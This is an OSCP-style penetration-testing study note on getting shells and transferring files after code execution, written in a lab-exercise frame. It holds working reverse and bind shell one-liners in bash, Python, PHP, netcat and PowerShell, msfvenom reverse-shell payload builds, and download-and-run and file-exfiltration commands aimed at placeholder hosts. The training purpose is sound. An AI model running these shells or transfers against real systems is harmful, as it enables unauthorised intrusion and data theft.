# Establish sessions and move files

[Overview](../START.canvas) · [Browser map](../Map.html)

Delivery, execution, connection and a usable session are separate states. Select a connection direction and compatible interpreter before generating payloads; transfers must preserve bytes and destination permissions.

## session-proof

### Verify command execution, host and represented identity

**Enter:** A PoC, injected command or remote client reports execution

**Discovery**

```text
hostname
id
pwd
```

**Interpret:** Host-specific identity output demonstrates execution under that account, not yet a reverse connection or full terminal.

**Still check:** Record OS, privilege and network position; choose an access form whose interpreter/service and route exist.

**Verify:** Save destination identity/hostname and actual command output; use Windows hostname/whoami/ipconfig when appropriate.

[Canonical procedure](https://armaanleg3nd.github.io/oscp/notes/methods/sessions-transfers/#session-proof)

### Full procedure and variants

```text
delivery → execution → connection → usable session
```

| State | Decisive evidence | Does not yet prove |
| --- | --- | --- |
| Delivery | Exact bytes/request reached intended consumer | Payload executed |
| Execution | Harmless command output or controlled side effect | Network callback works |
| Connection | Listener records the expected peer | Commands and I/O are usable |
| Session | Commands return and host/identity are verified | Higher privilege or stability |

Do not change all four layers at once. Preserve the last confirmed state and test the next boundary.

| Situation | Prefer | Main prerequisite / limitation |
| --- | --- | --- |
| One bounded action is enough | Direct command execution | Observable output or side effect; no shell required |
| Valid credential and remote service | SSH, WinRM or RDP | Authentication plus remote-logon authorization |
| Target can reach Kali | Reverse shell | Target egress and a reachable Kali listener |
| Kali can reach a target listener | Bind shell | Target can bind and inbound path permits it |
| Payload is staged or protocol-aware | Matching framework handler | Handler must use the exact payload/transport |

Prefer authenticated administrative access when it is already available: it is normally more stable, auditable and feature-complete than an improvised shell.

Linux:

```bash
id; hostname; pwd
```

Windows:

```cmd
whoami & hostname & cd
```

For blind execution, use one bounded callback or file side effect that the current context can produce and you can independently observe. Do not interpret a hung HTTP request as proof of a shell; the server may simply be waiting on a child process or timeout.

Linux:

```bash
hostname; id; pwd
ip addr; ip route
ss -lntup
```

Windows:

```cmd
hostname
whoami /all
cd
ipconfig /all
route print
netstat -ano
```

Record the destination host, actual identity, privilege, current directory, interfaces/routes, parent/execution context and the exact command that produced the session. Then re-enumerate from the new state.

```text
exact prerequisites
→ exploit reaches expected vulnerable path
→ bounded harmless effect or identity output
→ repeatable command execution
→ payload reaches listener
→ usable session
→ verified host/identity/privilege/network position
```

Do not accept the exploit's own “success” string as proof. Validate an independent effect. An HTTP `200`, uploaded filename, connection or application crash each proves less than a verified command result.

### Follow the evidence

- [ Connect a Linux reverse shell through an available interpreter](sessions-transfers.md#session-reverse) — Linux command execution exists but an interactive channel is needed Required: A confirmed Bash/Python/PHP/Netcat implementation, correct parser wrapping, target-to-listener route and compatible listener
- [ Establish Linux state and choose an escalation candidate](linux-privesc.md#linux-state) — A new Linux foothold or an identity/privilege change Required: A working command channel and accurate effective identity, group, mount and process context
- [ Establish Windows token, host and process context](windows-privesc.md#windows-state) — A new Windows session or claimed administrator/SYSTEM transition Required: A functioning command channel and the actual effective token/process context
## session-reverse

### Connect a Linux reverse shell through an available interpreter

**Enter:** Linux command execution exists but an interactive channel is needed

**Discovery**

```text
command -v bash python3 php nc
ip route get LHOST
```

**Interpret:** An interpreter plus a plausible outbound route suggests a reverse-channel candidate.

**Still check:** Verify target-to-listener reachability, listener binding, exact shell/parser and payload compatibility.

**Verify:** Run hostname/id through the returned channel and distinguish a TCP connection from a functioning shell.

[Canonical procedure](https://armaanleg3nd.github.io/oscp/notes/methods/sessions-transfers/#session-reverse)

### Full procedure and variants

```text
trigger context
→ target process/interpreter and architecture
→ target source interface
→ route/egress controls
→ LHOST address visible from target
→ LPORT
→ local bind interface
→ listener/handler
```

Select `LHOST` from the target's point of view. A VPN address, tunnel endpoint or reachable interface may be correct while Kali's default-route address is wrong.

On Kali:

```bash
ip -brief address
ip route
ss -lntp
```

Windows source/listener checks:

```powershell
Get-NetIPAddress -AddressFamily IPv4
Get-NetRoute -AddressFamily IPv4
Get-NetTCPConnection -State Listen
```

Traditional/OpenBSD-style `nc` commonly used on Kali:

```bash
rlwrap nc -lvnp LPORT
```

Nmap Ncat uses a positional listen port; do not mechanically copy every `nc` flag:

```bash
ncat -4 -lvn 0.0.0.0 LPORT
```

Verify the bind in another terminal:

```bash
ss -lntp | grep ':LPORT'
```

If multiple interfaces exist, bind deliberately:

```bash
ncat -4 -lvn LHOST LPORT
```

> **Failure cue:** a listener bound only to `127.0.0.1`, the wrong VPN/interface address or the wrong address family cannot receive the expected callback. “Address already in use” means another process owns the bind.

Choose an interpreter that you confirmed exists.

Bash TCP:

```bash
bash -c 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1'
```

Python 3 with a PTY:

```bash
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("LHOST",LPORT));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
```

Portable FIFO plus Netcat when `-e` is absent:

```bash
rm -f /tmp/f; mkfifo /tmp/f
cat /tmp/f | /bin/sh -i 2>&1 | nc LHOST LPORT >/tmp/f
```

PHP CLI:

```bash
php -r '$s=fsockopen("LHOST",LPORT);exec("/bin/sh -i <&3 >&3 2>&3");'
```

<details>
<summary><strong>Variant — target has Ncat command execution</strong></summary>

Linux:

```bash
ncat LHOST LPORT --exec /bin/sh
```

Windows:

```cmd
ncat.exe LHOST LPORT --exec cmd.exe
```

`--exec` exposes the named program directly to the network connection. Use only on the assigned host and remove transferred tooling when the exercise requires cleanup.

</details>

> **Shell-language cue:** a command injection may execute through `/bin/sh`, which does not understand every Bash construct. Wrap Bash-specific syntax in `bash -c '...'` and then encode it for the outer HTTP/template/database layer.

### Follow the evidence

- [ Repair a limited Linux terminal](sessions-transfers.md#session-tty) — A working shell lacks job control, terminal signals or interactive program support Required: A working channel and available PTY mechanism; correct local-terminal control sequence
- [ Diagnose connection direction, listener and session failures in order](execution.md#execution-callback) — Command execution or payload delivery exists but the expected usable channel does not Required: A recorded first execution proof, correct advertised route, active compatible listener and observable connection evidence
- [ Transfer over HTTP using Linux or Windows clients](sessions-transfers.md#transfer-http) — A tool/artifact must reach a target that can make an HTTP request Required: Correct server bind and served directory; target-to-server route, available downloader and writable destination
- [ Use a bind shell when the target can accept inbound connections](sessions-transfers.md#session-bind) — Reverse egress is unavailable but a target listener is reachable Required: Permission to bind, compatible Netcat/Ncat behavior and source-to-target listener connectivity through any required forward
## session-windows

### Use Windows authenticated access or a PowerShell command channel

**Enter:** Windows execution or valid credentials with an available remote service

**Discovery**

```text
whoami /all
$PSVersionTable
$ExecutionContext.SessionState.LanguageMode
```

**Interpret:** The execution identity and constrained language context affect which command-channel implementations can run.

**Still check:** Check permitted language features, remote endpoint authorization or a working callback route; encoding does not grant those.

**Verify:** Verify hostname, whoami /all and command behavior through the resulting channel.

[Canonical procedure](https://armaanleg3nd.github.io/oscp/notes/methods/sessions-transfers/#session-windows)

### Full procedure and variants

Prefer an available authenticated service:

```bash
evil-winrm -i TARGET -u USER -p 'PASSWORD'
xfreerdp /v:TARGET /u:'DOMAIN\USER' /p:'PASSWORD' /cert:ignore
ssh -p PORT USER@TARGET
```

PowerShell TCP shell when direct command execution is the only primitive:

```powershell
$client = [Net.Sockets.TcpClient]::new('LHOST',LPORT)
$stream = $client.GetStream()
$buffer = New-Object byte[] 65535
while (($count = $stream.Read($buffer,0,$buffer.Length)) -gt 0) {
  $command = [Text.Encoding]::ASCII.GetString($buffer,0,$count)
  $output = (Invoke-Expression $command 2>&1 | Out-String) + "PS $((Get-Location).Path)> "
  $bytes = [Text.Encoding]::ASCII.GetBytes($output)
  $stream.Write($bytes,0,$bytes.Length)
  $stream.Flush()
}
$client.Close()
```

> This is a basic command channel, not a ConPTY. Host policy, language mode, AMSI/antimalware, quoting and the parent process can affect it.

PowerShell `-EncodedCommand` solves nested quoting; it is not encryption or an AV bypass. Generate UTF-16LE Base64 locally:

```powershell
$command = 'COMMAND'
$encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($command))
$encoded
```

Invoke in the target command context:

```cmd
powershell.exe -NoProfile -NonInteractive -EncodedCommand BASE64_UTF16LE
```

### Follow the evidence

- [ Establish Windows token, host and process context](windows-privesc.md#windows-state) — A new Windows session or claimed administrator/SYSTEM transition Required: A functioning command channel and the actual effective token/process context
- [ Use WinRM, WinRS or PowerShell remoting](lateral-movement.md#move-winrm) — A WinRM listener and a candidate endpoint-authorized account Required: Reachable HTTP(S) listener, accepted authentication and endpoint/session configuration permissions; hash/ticket support depends on client/context
- [ Distinguish PowerShell policy, language mode and protected execution layers](execution.md#execution-powershell) — PowerShell reports scripts disabled, constrained syntax or an execution-control error Required: Actual host policy/language context and a supported allowed execution route; required runtime features remain available
## session-bind

### Use a bind shell when the target can accept inbound connections

**Enter:** Reverse egress is unavailable but a target listener is reachable

**Discovery**

```text
nc -h
ss -lnt
```

**Interpret:** The implementation cannot use an assumed -e shell; another supported listener mechanism is needed.

**Still check:** Confirm a compatible bind command, permitted listener and inbound source-to-target reachability.

**Verify:** Verify reachable listener plus hostname/id over the channel; record and later remove the created listener.

[Canonical procedure](https://armaanleg3nd.github.io/oscp/notes/methods/sessions-transfers/#session-bind)

### Full procedure and variants

Use a bind shell only when Kali can reach a target listener and reverse egress is unavailable.

Traditional Netcat with `-e` support on a Linux target:

```bash
nc -lvnp PORT -e /bin/sh
```

Connect from Kali:

```bash
nc -nv TARGET PORT
```

FIFO alternative when `-e` is absent:

```bash
rm -f /tmp/f; mkfifo /tmp/f
cat /tmp/f | /bin/sh -i 2>&1 | nc -lvnp PORT >/tmp/f
```

Ncat target listener:

```bash
ncat -4 -lvn 0.0.0.0 PORT --exec /bin/sh
```

> Bind shells expose a target port and may be blocked by the host firewall or upstream ACL. A successful local bind does not prove Kali can reach it.

### Follow the evidence

- [ Repair a limited Linux terminal](sessions-transfers.md#session-tty) — A working shell lacks job control, terminal signals or interactive program support Required: A working channel and available PTY mechanism; correct local-terminal control sequence
- [ Relay a single TCP service through a fixed forward](pivoting.md#fixed-forward) — One reachable pivot can connect to one internal TCP destination Required: A bindable pivot listener, source-to-listener access and pivot-to-destination connectivity
- [ Verify command execution, host and represented identity](sessions-transfers.md#session-proof) — A PoC, injected command or remote client reports execution Required: A functioning execution primitive and an observable output or controlled side effect
## payload-generate

### Generate a payload matching OS, process, format and handler

**Enter:** An existing exploit/delivery primitive needs a binary or raw payload

**Discovery**

```text
file TARGET_ARTIFACT
msfvenom -l payloads
msfvenom --list formats
```

**Interpret:** The staged payload name and executable consumer must be matched to the handler and delivery format.

**Still check:** Check target/process architecture, permitted feature, exact payload options, stage route and listener.

**Verify:** Check artifact format/hash and actual session identity; generation success is not execution proof.

[Canonical procedure](https://armaanleg3nd.github.io/oscp/notes/methods/sessions-transfers/#payload-generate)

### Full procedure and variants

List rather than guess names and formats:

```bash
msfvenom -l payloads | grep -E 'linux|windows' | grep -E 'x64|x86'
msfvenom --list formats
msfvenom -p PAYLOAD_NAME --list-options
```

Stageless command-shell binaries:

```bash
msfvenom -p linux/x64/shell_reverse_tcp \
  LHOST=LHOST LPORT=LPORT \
  -f elf -o shell.elf

msfvenom -p windows/x64/shell_reverse_tcp \
  LHOST=LHOST LPORT=LPORT \
  -f exe -o shell.exe
```

Verify the resulting artifacts:

```bash
file shell.elf shell.exe
sha256sum shell.elf shell.exe
```

> `msfvenom` does not make a payload compatible with the delivery path. Match target OS, process architecture, payload type, output format, available execution method and callback route.

##### Staged versus stageless

```text
stageless: complete payload delivered at once; larger, usually simpler and more stable
staged: small first stage connects and retrieves the rest; smaller initial footprint, needs matching handler and second transfer
```

Metasploit naming commonly reflects the distinction:

```text
windows/x64/shell_reverse_tcp   stageless
windows/x64/shell/reverse_tcp   staged
```

A raw Netcat listener can receive many ordinary stageless command shells. A staged payload normally needs `multi/handler` configured with the exact same payload:

```text
msfconsole -q
use exploit/multi/handler
set payload PAYLOAD_NAME
set LHOST LHOST
set LPORT LPORT
show options
run
```

> A connection to Netcat with no usable commands can mean a staged payload reached a non-staging listener. It is not necessarily failed code execution.

##### Existing-PoC payload constraints

Only when an existing reviewed PoC documents payload space and bad characters:

```bash
msfvenom -p PAYLOAD_NAME \
  LHOST=LHOST LPORT=LPORT \
  -f FORMAT -v VARIABLE \
  -b 'BAD_CHARACTERS' \
  -s MAX_SPACE
```

Encoders and repeated encoding do not guarantee antimalware evasion. `-b` is for bytes that the vulnerable input path cannot preserve; do not invent a universal bad-character list.

### Follow the evidence

- [ Match an artifact to its executable consumer and runtime](execution.md#execution-format) — A downloaded/generated artifact exists but does not run Required: Matching OS/process architecture, interpreter/loader/runtime, intact bytes, execute/destination permissions and compatible format
- [ Pair staged payloads with the correct handler and session lifecycle](execution.md#execution-handler) — A payload connects without a session, or a handler/session exits unexpectedly Required: Exact payload/architecture/transport pairing, correct listener binding, reachable staging path and suitable job/session configuration
- [ Verify command execution, host and represented identity](sessions-transfers.md#session-proof) — A PoC, injected command or remote client reports execution Required: A functioning execution primitive and an observable output or controlled side effect
## session-tty

### Repair a limited Linux terminal

**Enter:** A working shell lacks job control, terminal signals or interactive program support

**Discovery**

```text
tty
command -v python3 script socat
```

**Interpret:** A functioning socket shell lacks a controlling terminal while a potential PTY mechanism exists.

**Still check:** Verify the available PTY mode, local terminal handling and stable connection; privilege remains unchanged.

**Verify:** Check tty, signal handling and an interactive program; confirm the same identity remains.

[Canonical procedure](https://armaanleg3nd.github.io/oscp/notes/methods/sessions-transfers/#session-tty)

### Full procedure and variants

First obtain a PTY with an available interpreter:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Press `Ctrl-Z` locally, then:

```bash
stty raw -echo; fg
```

Back in the remote shell:

```bash
reset
export TERM=xterm-256color
stty rows 40 columns 120
```

If the local terminal becomes unreadable, restore it from a separate/local shell:

```bash
stty sane
```

Socat can provide a stronger PTY when present on both sides:

```bash
# Kali
socat file:$(tty),raw,echo=0 tcp-listen:LPORT,reuseaddr

# Target
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:LHOST:LPORT
```

> TTY repair changes terminal behavior, not privilege or network reliability. A PTY may enable job control and programs that require a terminal; it does not turn a fragile route into a stable one.

### Follow the evidence

- [ Use an allowed sudo operation to cross a privilege boundary](linux-privesc.md#linux-sudo) — sudo -l grants an operation under a more useful identity Required: Exact executable/run-as/argument rule permits a useful primitive; password tags, environment and policy do not invalidate it
- [ Establish Linux state and choose an escalation candidate](linux-privesc.md#linux-state) — A new Linux foothold or an identity/privilege change Required: A working command channel and accurate effective identity, group, mount and process context
- [ Use SSH passwords, keys and forwarding-capable access](services.md#service-ssh) — An SSH service and a known password, private key or agent context Required: Compatible authentication method, correct user, accepted key policy and the requested shell/subsystem permission
## transfer-http

### Transfer over HTTP using Linux or Windows clients

**Enter:** A tool/artifact must reach a target that can make an HTTP request

**Discovery**

```text
command -v curl wget
ls -ld /tmp
ip route get LHOST
```

**Interpret:** A downloader, destination and plausible outbound path enable an HTTP transfer candidate.

**Still check:** Check actual server bind/directory, HTTP request/response and source/destination hashes.

**Verify:** Compare sha256sum on Linux or Get-FileHash -Algorithm SHA256 on Windows, and verify destination permissions.

[Canonical procedure](https://armaanleg3nd.github.io/oscp/notes/methods/sessions-transfers/#transfer-http)

### Full procedure and variants

On Kali, serve the directory containing `linpeas.sh`:

```bash
cd /path/to/tools
python3 -m http.server 8000 --bind 0.0.0.0
```

On the Linux target, download into a writable directory and run it:

```bash
wget http://LHOST:8000/linpeas.sh -O /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh
/tmp/linpeas.sh | tee /tmp/linpeas.txt
```

> **Read:** Kali should log an HTTP request and a successful response. A downloaded enumeration script is a lead generator; manually verify any escalation candidate.

<details>
<summary><strong>HTTP variants — fixed server directory, curl, Windows and alternate built-ins</strong></summary>

##### Serve a fixed directory without changing folders

```bash
python3 -m http.server 8000 --bind 0.0.0.0 --directory /path/to/tools
```

Python's simple server supplies downloads over unencrypted HTTP. Stop it with `Ctrl+C` when finished.

##### Linux target with curl

```bash
curl -fL http://LHOST:8000/FILE -o /tmp/FILE
```

`-f` reports HTTP errors and `-L` follows redirects. Use a writable destination.

##### Windows target with PowerShell

Run inside PowerShell:

```powershell
Invoke-WebRequest -Uri "http://LHOST:8000/FILE" -OutFile "C:\Windows\Temp\FILE"
```

From `cmd.exe`, invoke PowerShell explicitly:

```cmd
powershell -NoProfile -Command "Invoke-WebRequest -Uri 'http://LHOST:8000/FILE' -OutFile 'C:\Windows\Temp\FILE'"
```

##### Windows alternatives

```powershell
(New-Object Net.WebClient).DownloadFile('http://LHOST:8000/FILE','C:\Windows\Temp\FILE')
```

```cmd
curl.exe -fL http://LHOST:8000/FILE -o C:\Windows\Temp\FILE
```

```cmd
certutil.exe -urlcache -split -f http://LHOST:8000/FILE C:\Windows\Temp\FILE
```

Availability and policy can differ by host. `certutil` may leave URL-cache artifacts; remove only artifacts you created when cleanup is appropriate.

</details>

Compare the source and destination hashes.

On Kali or Linux:

```bash
sha256sum FILE
sha256sum /tmp/FILE
```

On Windows:

```powershell
Get-FileHash -Algorithm SHA256 "C:\Windows\Temp\FILE"
```

> **Decisive output:** matching SHA-256 values establish that the two saved files contain the same bytes. A successful HTTP status alone does not.

### Follow the evidence

- [ Match an artifact to its executable consumer and runtime](execution.md#execution-format) — A downloaded/generated artifact exists but does not run Required: Matching OS/process architecture, interpreter/loader/runtime, intact bytes, execute/destination permissions and compatible format
- [ Use enumeration tools to generate manually testable candidates](linux-privesc.md#linux-enumerators) — A Linux foothold is available; run an early sweep for sudo rules, file capabilities, credentials and writable privileged paths Required: Verified target UID and architecture, a working shell/runtime, a reviewed transferred tool and a writable report location
- [ Turn automated Windows findings into manually verified candidates](windows-privesc.md#windows-enumerators) — A Windows foothold is available; run winPEAS or a focused survey for service/task permissions, token privileges and credentials Required: Verified current token and architecture, a compatible reviewed executable or allowed PowerShell runtime, and a writable report location
- [ Move Windows files through an authenticated SMB share](sessions-transfers.md#transfer-smb) — A Windows source can reach a temporary assessment-side SMB service Required: Inbound SMB listener on the server, outbound TCP/445 from the client, compatible SMB version and explicit share credentials
- [ Stream a file over a direct TCP connection](sessions-transfers.md#transfer-stream) — Only a raw TCP tool and a direct or forwarded connection are available Required: Unambiguous sender/receiver direction, compatible Netcat listener syntax and a writable output file
- [ Move a small artifact through a text-only channel](sessions-transfers.md#transfer-text) — The existing command channel permits text but no convenient file-transfer connection Required: Available Base64 encode/decode, adequate command length and a writable destination
- [ Use a temporary FTP transfer as a constrained fallback](sessions-transfers.md#transfer-ftp) — The target has an FTP client and simpler transfer routes are unavailable Required: A deliberately selected temporary server, correct served directory, control/data paths and binary transfer mode
## transfer-scp

### Copy files through an authenticated SSH service

**Enter:** An SSH identity can access the needed source/destination

**Discovery**

```text
ssh -v -p PORT USER@TARGET
```

**Interpret:** SSH authentication gives a candidate transport; it does not prove SFTP/subsystem support or destination write.

**Still check:** Validate client/server subsystem compatibility, source read and destination write; inspect resulting bytes.

**Verify:** Verify copied bytes and location; uppercase -P selects scp's SSH port.

[Canonical procedure](https://armaanleg3nd.github.io/oscp/notes/methods/sessions-transfers/#transfer-scp)

### Full procedure and variants

<details>
<summary><strong>SCP — copy through an authenticated SSH service</strong></summary>

##### Kali to a Linux target

```bash
scp FILE USER@TARGET:/tmp/FILE
```

##### Linux target to Kali

Run from Kali when the target's SSH service is reachable:

```bash
scp USER@TARGET:/path/to/FILE ./FILE
```

##### SSH key or nonstandard port

```bash
scp -i KEY -P PORT FILE USER@TARGET:/tmp/FILE
```

`scp` uses uppercase `-P` for the SSH port. Authentication success does not guarantee write permission at the destination path.

</details>

### Follow the evidence

- [ Match an artifact to its executable consumer and runtime](execution.md#execution-format) — A downloaded/generated artifact exists but does not run Required: Matching OS/process architecture, interpreter/loader/runtime, intact bytes, execute/destination permissions and compatible format
- [ Transfer over HTTP using Linux or Windows clients](sessions-transfers.md#transfer-http) — A tool/artifact must reach a target that can make an HTTP request Required: Correct server bind and served directory; target-to-server route, available downloader and writable destination
- [ Use SSH passwords, keys and forwarding-capable access](services.md#service-ssh) — An SSH service and a known password, private key or agent context Required: Compatible authentication method, correct user, accepted key policy and the requested shell/subsystem permission
## transfer-smb

### Move Windows files through an authenticated SMB share

**Enter:** A Windows source can reach a temporary assessment-side SMB service

**Discovery**

```text
Test-NetConnection LHOST -Port 445
net use
```

**Interpret:** The service is reachable, but an existing connection can constrain a different credential context.

**Still check:** Verify intended share/server credentials, conflicting mappings, read/write rights and destination hash.

**Verify:** Verify source/destination hash and the share path; disconnect created mappings after use.

[Canonical procedure](https://armaanleg3nd.github.io/oscp/notes/methods/sessions-transfers/#transfer-smb)

### Full procedure and variants

<details>
<summary><strong>SMB — read and write files from Windows</strong></summary>

##### Start an authenticated SMB share on Kali

```bash
mkdir -p share
sudo impacket-smbserver transfer "$(pwd)/share" -smb2support -username USER -password 'PASSWORD'
```

The first positional value is the share name; the second is its local directory. The supplied `USER` and `PASSWORD` authenticate to this temporary Kali share.

Some installations expose the legacy wrapper name:

```bash
sudo smbserver.py transfer "$(pwd)/share" -smb2support -username USER -password 'PASSWORD'
```

##### Connect and download from Windows

```cmd
net use \\LHOST\transfer /user:USER "PASSWORD"
copy \\LHOST\transfer\FILE C:\Windows\Temp\FILE
```

##### Upload evidence from Windows to Kali

```cmd
copy C:\Windows\Temp\FILE \\LHOST\transfer\FILE
net use \\LHOST\transfer /delete
```

Kali must accept inbound TCP/445 and the target must permit outbound SMB. The share is read/write unless started with Impacket's `-readonly` option.

</details>

### Follow the evidence

- [ Match an artifact to its executable consumer and runtime](execution.md#execution-format) — A downloaded/generated artifact exists but does not run Required: Matching OS/process architecture, interpreter/loader/runtime, intact bytes, execute/destination permissions and compatible format
- [ Turn automated Windows findings into manually verified candidates](windows-privesc.md#windows-enumerators) — A Windows foothold is available; run winPEAS or a focused survey for service/task permissions, token privileges and credentials Required: Verified current token and architecture, a compatible reviewed executable or allowed PowerShell runtime, and a writable report location
- [ Transfer over HTTP using Linux or Windows clients](sessions-transfers.md#transfer-http) — A tool/artifact must reach a target that can make an HTTP request Required: Correct server bind and served directory; target-to-server route, available downloader and writable destination
## transfer-stream

### Stream a file over a direct TCP connection

**Enter:** Only a raw TCP tool and a direct or forwarded connection are available

**Discovery**

```text
nc -h
ls -ld /DESTINATION_DIRECTORY
```

**Interpret:** A raw stream may move bytes only if roles and connection direction are correct; no integrity metadata is supplied.

**Still check:** Confirm listener syntax, reachability, binary-clean I/O and a complete independent hash match.

**Verify:** Compare hashes and avoid mixing diagnostic text into the file stream.

[Canonical procedure](https://armaanleg3nd.github.io/oscp/notes/methods/sessions-transfers/#transfer-stream)

### Full procedure and variants

<details>
<summary><strong>Netcat — stream a file when a direct TCP connection is possible</strong></summary>

##### Retrieve a file from the target to Kali

Kali receives:

```bash
nc -lvnp PORT > FILE
```

The target sends:

```bash
nc -nv LHOST PORT < /path/to/FILE
```

##### Send a file from Kali to the target

The target receives:

```bash
nc -lvnp PORT > /tmp/FILE
```

Kali sends:

```bash
nc -nv TARGET PORT < FILE
```

If the listener rejects `-p`, use the OpenBSD-style form and check `nc -h` locally:

```bash
nc -lvn PORT > FILE
```

Netcat provides no authentication, encryption, filename metadata or integrity check. Confirm direction and compare hashes afterward.

</details>

### Follow the evidence

- [ Match an artifact to its executable consumer and runtime](execution.md#execution-format) — A downloaded/generated artifact exists but does not run Required: Matching OS/process architecture, interpreter/loader/runtime, intact bytes, execute/destination permissions and compatible format
- [ Transfer over HTTP using Linux or Windows clients](sessions-transfers.md#transfer-http) — A tool/artifact must reach a target that can make an HTTP request Required: Correct server bind and served directory; target-to-server route, available downloader and writable destination
- [ Relay a single TCP service through a fixed forward](pivoting.md#fixed-forward) — One reachable pivot can connect to one internal TCP destination Required: A bindable pivot listener, source-to-listener access and pivot-to-destination connectivity
## transfer-text

### Move a small artifact through a text-only channel

**Enter:** The existing command channel permits text but no convenient file-transfer connection

**Discovery**

```text
command -v base64
wc -c FILE
```

**Interpret:** A small artifact and compatible decoder make text transport plausible, without assuming large encoded commands survive.

**Still check:** Verify exact length/quoting and source/destination hash; use the Windows decoding variant when appropriate.

**Verify:** Require a complete matching hash; keep encoded secrets in private evidence rather than reusable notes.

[Canonical procedure](https://armaanleg3nd.github.io/oscp/notes/methods/sessions-transfers/#transfer-text)

### Full procedure and variants

<details>
<summary><strong>Base64 — move a small file through a text-only channel</strong></summary>

##### Encode on Linux

```bash
base64 -w 0 FILE
```

##### Decode on Linux

```bash
printf '%s' 'BASE64_DATA' | base64 -d > /tmp/FILE
```

##### Decode in PowerShell

```powershell
[IO.File]::WriteAllBytes('C:\Windows\Temp\FILE',[Convert]::FromBase64String('BASE64_DATA'))
```

Use this for small files. Long encoded values are easy to truncate or corrupt; compare hashes.

</details>

### Follow the evidence

- [ Repair quoting, encoding and command-length boundaries](execution.md#execution-parser) — A simple command works while a longer or nested payload fails Required: Known outer request/template/database parser and inner shell; correct character encoding and transport length
- [ Transfer over HTTP using Linux or Windows clients](sessions-transfers.md#transfer-http) — A tool/artifact must reach a target that can make an HTTP request Required: Correct server bind and served directory; target-to-server route, available downloader and writable destination
- [ Classify the artifact and its identity context](credentials.md#credential-classify) — A secret-like value, key file, stored hash, challenge response or ticket Required: Artifact provenance and format; possible local/domain/application identity and compatible protocol
## transfer-ftp

### Use a temporary FTP transfer as a constrained fallback

**Enter:** The target has an FTP client and simpler transfer routes are unavailable

**Discovery**

```text
ftp
help
quit
```

**Interpret:** Client availability permits investigating FTP; binary mode and separate data-channel paths remain necessary.

**Still check:** Verify deliberate server scope, control/data connectivity, required read/write and post-transfer hashes.

**Verify:** Compare bytes and stop the temporary server after its purpose is complete.

[Canonical procedure](https://armaanleg3nd.github.io/oscp/notes/methods/sessions-transfers/#transfer-ftp)

### Full procedure and variants

<details>
<summary><strong>Temporary FTP — only when an FTP client is the available route</strong></summary>

On Kali, after intentionally selecting/installing `pyftpdlib` in an isolated environment:

```bash
python3 -m pyftpdlib -p PORT
```

On the target:

```text
ftp LHOST PORT
binary
get FILE
put FILE
quit
```

The default temporary server can be unauthenticated and plaintext. Bind/serve only the intended directory, expose it only for the transfer, compare hashes and stop it immediately. HTTP/SCP/SMB are normally preferable.

</details>

### Follow the evidence

- [ Match an artifact to its executable consumer and runtime](execution.md#execution-format) — A downloaded/generated artifact exists but does not run Required: Matching OS/process architecture, interpreter/loader/runtime, intact bytes, execute/destination permissions and compatible format
- [ Transfer over HTTP using Linux or Windows clients](sessions-transfers.md#transfer-http) — A tool/artifact must reach a target that can make an HTTP request Required: Correct server bind and served directory; target-to-server route, available downloader and writable destination
- [ Copy files through an authenticated SSH service](sessions-transfers.md#transfer-scp) — An SSH identity can access the needed source/destination Required: Reachable SSH/SFTP service, correct key/password and read/write rights; client/server subsystem compatibility
